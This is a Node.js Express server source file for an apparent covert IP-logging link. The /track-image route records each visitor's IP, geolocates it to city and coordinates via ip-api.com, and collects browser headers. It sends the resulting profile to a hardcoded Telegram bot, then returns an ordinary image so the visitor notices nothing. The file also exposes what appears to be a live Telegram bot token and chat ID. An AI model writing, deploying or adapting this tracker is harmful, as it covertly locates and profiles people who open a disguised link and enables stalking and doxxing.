const express = require("express");
const axios = require("axios");
const fs = require("fs");
const app = express();

const port = process.env.PORT || 3000;
const telegramBotToken = "8054463444:AAGU44U27Hly1LPgMqM2H_5fYwVQCbgLFME";
const telegramChatId = "1387832458";

// ✅ Redirect root to /track-image
app.get("/", (req, res) => {
  res.redirect("/track-image");
});

app.get("/track-image", async (req, res) => {
  const ip = (req.headers["x-forwarded-for"] || req.socket.remoteAddress || "")
    .split(",")[0]
    .trim();

  console.log("Captured IP:", ip);
  const timestamp = new Date().toISOString();
  const log = `IP: ${ip} | Time: ${timestamp}\n`;

  fs.appendFile("ip_logs.txt", log, (err) => {
    if (err) console.error("Error saving log:", err);
  });

  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    console.log("API Response:", response.data);

    if (response.data.status === "fail") {
      throw new Error(`API failed: ${response.data.message}`);
    }

    const {
      country = "Unknown",
      countryCode = "Unknown",
      region = "Unknown",
      regionName = "Unknown",
      city = "Unknown",
      district = "Not Available",
      zip = "Not Available",
      lat = "Unknown",
      lon = "Unknown",
      timezone = "Unknown",
      isp = "Unknown",
      org = "Unknown",
      as = "Unknown",
    } = response.data;

    const userAgent = req.headers["user-agent"] || "Unknown";
    const language = req.headers["accept-language"] || "Unknown";
    const referer = req.headers["referer"] || "Direct Link";
    const connection = req.headers["connection"] || "Unknown";
    const host = req.headers["host"] || "Unknown";

    const detailedData = `
🕵️ New Visitor Tracked!
-------------------------------
📍 IP Address: ${ip}
🌍 Country: ${country} (${countryCode})
🏙️ Region: ${regionName} (${region})
🏡 City: ${city}
🧭 District: ${district}
📮 ZIP: ${zip}
📌 Coordinates: ${lat}, ${lon}
🕰️ Timezone: ${timezone}
📡 ISP: ${isp}
🏢 Organization: ${org}
🔢 ASN: ${as}
-------------------------------
🖥️ User-Agent: ${userAgent}
🗣️ Language: ${language}
🔗 Referer: ${referer}
🌐 Host: ${host}
🕓 Timestamp: ${timestamp}
`;

    await axios.get(
      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
      {
        params: {
          chat_id: telegramChatId,
          text: detailedData,
        },
      }
    );
  } catch (err) {
    console.error("Error:", err.message);
    await axios.get(
      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
      {
        params: {
          chat_id: telegramChatId,
          text: `❌ Error fetching info for IP: ${ip}\nReason: ${err.message}`,
        },
      }
    );
  }

  res.sendFile(__dirname + "/image.jpg");
});

app.listen(port, () => {
  console.log(`✅ Server running on port ${port}`);
});
